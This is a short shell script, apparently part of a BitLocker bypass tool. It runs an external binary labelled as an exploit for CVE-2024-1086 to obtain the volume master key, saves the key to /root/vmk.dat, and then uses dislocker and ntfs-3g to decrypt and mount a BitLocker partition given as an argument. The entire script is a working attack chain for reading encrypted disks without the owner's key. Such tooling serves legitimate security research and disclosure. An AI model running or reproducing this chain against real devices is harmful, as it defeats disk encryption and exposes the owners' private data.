#!/bin/ash

echoInfo () {
    echo -e "\e[33;1m[+]\e[0m \e[33mInfo: $1\e[0m" >&2
}

if [ "$1" = "" ]
then
  echoInfo "Usage: $0 <partition>"
  echoInfo "(usually something like /dev/sda3)"
  exit
fi

PARTITION=$1

FILE=/root/vmk.dat
if [ -f "$FILE" ]; then
    echo "$FILE already exists, skipping exploit."
else
    # run CVE-2024-1086 exploit
    echoInfo "Exploiting CVE-2024-1086 and obtaining VMK..."
    su bitpix -c exploit
    echoInfo "VMK saved in $FILE!"
    hexdump $FILE
fi

# decrypt and mount the file system
echoInfo "Unlocking BitLocker partition..."
modprobe fuse
mkdir /root/bitlocker
dislocker -V $PARTITION -K $FILE -- bitlocker
mkdir /root/mnt
modprobe loop
mount -t ntfs-3g -o loop /root/bitlocker/dislocker-file /root/mnt
echoInfo "Mounted partition into /root/mnt!"
ls /root/mnt
echo ""
echoInfo "Don't forget to unmount using umount /root/mnt!"
